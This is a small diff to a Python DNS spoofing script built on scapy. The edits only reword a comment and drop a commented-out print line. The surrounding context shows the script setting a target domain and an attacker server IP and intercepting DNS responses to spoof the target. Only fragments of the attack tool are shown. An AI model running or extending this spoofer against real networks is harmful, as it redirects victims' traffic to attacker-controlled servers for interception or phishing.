@@ -8,7 +8,7 @@ import re
 # this dns spoofer only for http sites
 site_dns_attack = "e-m-b.org"
 
-# your server in computer hack
+# your server in attacker computer
 fack_site = "192.168.57.137"
 
 
@@ -25,7 +25,6 @@ def process_packet(packet):
 
     # DNSRQ dns request, DNSRR dns response
     if scapy_packet.haslayer(scapy.DNSRR):
-        # print(scapy_packet)
         qname = scapy_packet[scapy.DNSQR].qname
         if site_dns_attack in str(qname):
             print('[+] Spoofing target')
